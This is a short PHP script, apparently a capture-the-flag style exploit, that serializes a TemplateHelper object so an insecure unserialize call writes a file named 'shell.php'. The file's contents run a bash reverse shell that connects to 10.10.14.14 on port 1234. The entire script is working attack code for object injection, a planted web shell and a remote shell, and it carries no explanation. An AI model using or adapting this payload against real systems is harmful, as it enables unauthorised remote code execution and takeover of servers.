<?php
class TemplateHelper
{

    public $file;
    public $data;
}

$obj = new TemplateHelper;
$obj->file = "shell.php";
$obj->data = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'\");";
echo serialize($obj);
echo "\n";
